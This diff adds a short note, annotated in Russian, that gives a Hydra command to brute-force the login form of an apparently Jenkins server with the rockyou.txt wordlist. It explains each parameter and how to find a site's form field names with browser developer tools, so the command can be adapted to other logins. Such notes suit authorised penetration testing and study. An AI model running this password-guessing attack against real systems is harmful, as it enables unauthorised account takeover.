@@ -1,0 +1,13 @@
+hydra -l admin -P rockyou.txt 192.168.0.1 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^$j_password=^PASS^$Submit=Sign in:Invalid username or password" -V
+
+где:
+-l admin - username
+-P rockyou.txt - файл с паролями
+192.168.0.1 - адрес сервера (или имя)
+-s 8080 - порт сервера
+http-post-form - тип реквеста
+/j_acegi_security_check - страница на которую засылается реквест
+j_username - поле username (как она называется на определенном сайте можно посмотреть в браузере через режим разработчика F12, попробовав ввести какой то логин и пароль, и посмотрев post-request)
+j_password - поле с паролем (можно посмотреть в браузере через режим разработчика F12)
+Submit=Sign in - кнопка входа
+Invalid username or password - сообщение о некорректном входе
